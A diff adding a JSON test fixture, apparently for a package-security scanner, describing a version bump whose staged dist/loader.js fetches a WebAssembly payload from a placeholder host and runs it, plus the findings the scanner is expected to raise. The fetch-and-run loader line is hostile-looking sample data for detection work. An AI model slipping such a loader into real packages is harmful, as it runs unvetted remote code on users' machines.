@@ -1,0 +1,54 @@
+{
+  "id": "wasm-instantiate-loader",
+  "title": "Added file instantiates a fetched WebAssembly payload",
+  "category": "obfuscation-network",
+  "intent": "Cover the WebAssembly.instantiateStreaming(fetch(...)) loader idiom for packed wasm payloads; WebAssembly.compile was already flagged but the instantiate variants are the shape real droppers use.",
+  "previousPackageJson": {
+    "name": "wasm-instantiate-loader",
+    "version": "1.0.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "wasm-instantiate-loader",
+    "version": "1.0.1",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 71,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"wasm-instantiate-loader\",\"version\":\"1.0.0\",\"main\":\"index.js\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 71,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"wasm-instantiate-loader\",\"version\":\"1.0.1\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "dist/loader.js",
+      "size": 133,
+      "sha256": "loader-js",
+      "flags": [],
+      "textSample": "const { instance } = await WebAssembly.instantiateStreaming(fetch('https://example.invalid/payload.wasm'));\ninstance.exports.run();\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "dist/loader.js"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "high",
+      "file": "dist/loader.js"
+    }
+  ]
+}
